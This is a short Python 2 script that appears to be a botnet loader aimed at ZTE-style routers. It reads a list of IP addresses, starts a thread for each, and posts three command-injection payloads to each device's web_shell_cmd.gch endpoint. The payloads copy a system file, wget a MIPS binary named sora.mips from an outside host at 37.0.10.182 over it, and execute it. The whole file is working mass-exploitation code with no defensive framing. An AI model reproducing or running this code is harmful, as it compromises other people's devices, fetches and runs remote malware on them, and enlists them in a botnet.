import threading, sys, time, random, socket, subprocess, re, os, struct, array, requests
from threading import Thread
from time import sleep
import requests
from requests.auth import HTTPDigestAuth
from decimal import *
ips = open(sys.argv[1], "r").readlines()

cp_payload = "IF_ACTION=apply&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC&IF_ERRORTYPE=-1&Cmd=cp+%2Fetc%2Finit.norm+%2Fvar%2Ftmp%2Finit.norm&CmdAck="
dl_payload = "IF_ACTION=apply&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC&IF_ERRORTYPE=-1&Cmd=wget+http%3A%2F%2F37.0.10.182%2Fbins%2Fsora.mips+-O+%2Fvar%2Ftmp%2Finit.norm&CmdAck="
ex_payload = "IF_ACTION=apply&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC&IF_ERRORTYPE=-1&Cmd=%2Fvar%2Ftmp%2Finit.norm+ztev2&CmdAck="

class ztev2(threading.Thread):
	def __init__ (self, ip):
		threading.Thread.__init__(self)
		self.ip = str(ip).rstrip('\n')
	def run(self):
		try:
			print "[ZTEV2] Loading - " + self.ip
			url = "http://" + self.ip + "/web_shell_cmd.gch"
			requests.post(url, timeout=5, data=cp_payload)
			requests.post(url, timeout=5, data=dl_payload)
			requests.post(url, timeout=5, data=ex_payload)
		except Exception as e:
			print "[ZTEV2] Failed - " + self.ip
			pass

for ip in ips:
	try:
		n = ztev2(ip)
		n.start()
		time.sleep(0.03)
	except:
		pass